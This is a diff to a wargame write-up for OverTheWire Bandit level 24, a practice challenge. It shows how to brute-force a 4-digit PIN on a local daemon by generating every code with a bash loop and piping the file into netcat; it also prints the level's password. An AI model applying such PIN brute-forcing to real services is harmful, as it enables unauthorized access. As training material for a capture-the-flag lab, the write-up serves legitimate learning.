@@ -5,9 +5,10 @@ A daemon is listening on port 30002 and will give you the password for bandit25 
 
 <br/>
 ## Solution
-We have to perform a bruteforce to get password for next Level.
+We have to perform a bruteforce attach to get password for next Level.
 
-First, lets connect using netcat.
+<br/>
+Lets connect using netcat and see what happens.
 
 ```shell
 bandit24@bandit:~$ nc localhost 30002                                                                                                                                
@@ -19,6 +20,7 @@ Wrong! Please enter the correct pincode. Try again.
 Timeout. Exiting. 
 ```
 
+<br/>
 We will generate a file containing password and all possible 4 digits numbers. This is done using below one liner.
 
 ```shell
@@ -27,11 +29,13 @@ bandit24@bandit:~$ for i in {1000..10000}; do echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1
 
 Now provide this file as input to netcat and this will reveal password for next Level.
 
+<br/>
 Final Command:
 ```shell
 bandit24@bandit:~$ nc localhost 30002 < /tmp/payload24
 ```
 
+<br/>
 Solution Screenshot:
 
 ![Level 24 Image](./images/Level24.png)
